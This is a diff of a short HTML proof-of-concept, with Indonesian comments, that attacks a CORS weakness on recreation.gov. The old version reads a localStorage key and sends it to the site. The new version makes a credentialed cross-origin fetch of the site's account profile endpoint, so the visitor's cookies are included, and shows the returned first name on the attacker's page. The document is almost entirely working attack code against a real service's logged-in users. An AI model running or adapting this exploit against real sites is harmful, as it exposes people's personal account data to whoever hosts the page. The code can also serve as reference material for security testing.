@@ -6,27 +6,28 @@
 <body>
     <h1>POC - Ambil Cookie dengan CORS</h1>
     <script>
-        // Mengambil data dari local storage
-var localStorageData = localStorage.getItem('ljs-cache'); // Ganti 'namaKunci' dengan kunci yang sesuai
-
-        console.log(localStorageData);
-
-// Mengirim data menggunakan XMLHttpRequest
-var xhr = new XMLHttpRequest();
-xhr.open("GET", "https://www.recreation.gov/", true); // Ganti dengan URL server yang sesuai
-xhr.setRequestHeader("Content-Type", "text/plain"); // Mengatur header
-
-// Mengatur fungsi yang akan dijalankan ketika permintaan selesai
-xhr.onload = function() {
-    if (xhr.status === 200) {
-        console.log('Data berhasil dikirim:', localStorageData);
-    } else {
-        console.error('Gagal mengirim data:', xhr.statusText);
+        // Mengambil data dari profil akun
+fetch('https://www.recreation.gov/account/profile', {
+    method: 'GET',
+    credentials: 'include' // Menyertakan cookie jika ada
+})
+.then(response => {
+    if (!response.ok) {
+        throw new Error('Network response was not ok: ' + response.statusText);
     }
-};
+    return response.json(); // Mengambil data dalam format JSON
+})
+.then(data => {
+    console.log('Data berhasil diambil:', data);
+    
+    // Misalnya, menampilkan First Name ke dalam input
+    const firstNameInput = document.getElementById('first-name-input');
+    firstNameInput.value = data.first_name || ''; // Mengatur nilai input
+})
+.catch((error) => {
+    console.error('Gagal mengambil data:', error);
+});
 
-// Mengirim data
-xhr.send(localStorageData);
 
     </script>
 </body>
